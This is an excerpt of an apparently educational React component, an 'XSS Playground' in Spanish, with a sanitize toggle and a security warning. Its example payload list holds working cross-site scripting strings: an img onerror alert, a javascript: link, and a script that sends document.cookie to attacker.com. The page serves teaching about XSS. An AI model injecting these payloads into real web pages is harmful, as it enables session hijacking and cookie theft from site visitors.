...
const XSS = () => {
  ...
  const examplePayloads: ExamplePayload[] = [
    ...
    {
      label: 'Image Error',
      value: '<img src="x" onerror="alert(\'Imagen hackeada\')">',
      description: 'Explotar evento onerror',
    },
    {
      label: 'Div Rojo',
      value:
        '<div style="color:red; padding:10px; border:1px solid red;">¡Contenido malicioso!</div>',
      description: 'HTML inofensivo',
    },
    {
      label: 'Link Malicioso',
      value:
        '<a href="javascript:alert(\'Click hackeado\')" style="color:blue;">Click aquí</a>',
      description: 'JavaScript en href',
    },
    {
      label: 'Steal Cookies',
      value:
        "<script>fetch('https://attacker.com/steal?c=' + document.cookie)</script>",
      description: 'Robo de cookies (simulado)',
    },
  ];
  ...
  const renderOutput = (): React.ReactNode => {
    ...
    const content = isSafeMode ? sanitizeHTML(message) : message;
  ...
  return (
    <div className={styles.xss}>
      ...
      <header className={styles.xss__header}>
        <h1 className={`${styles.xss__title} text-gradient`}>XSS Playground</h1>
        <p className={styles.xss__subtitle}>
          Entorno interactivo para aprender sobre Cross-Site Scripting
        </p>

        <div className={styles.xss__warning}>
          <span className={styles.xss__warningIcon}>⚠️</span>
          <div className={styles.xss__warningContent}>
            <strong className={styles.xss__warningTitle}>
              Advertencia de Seguridad
            </strong>
            <p className={styles.xss__warningText}>
              Esta es una demostración educativa. Nunca ejecutes código no
          ...
          >
            ...
            <div className={styles.xss__outputStats}>
              ...
              <div className={styles.xss__stat}>
                ...
                <span className={styles.xss__statValue}>{message.length}</span>
              </div>
              <div className={styles.xss__stat}>
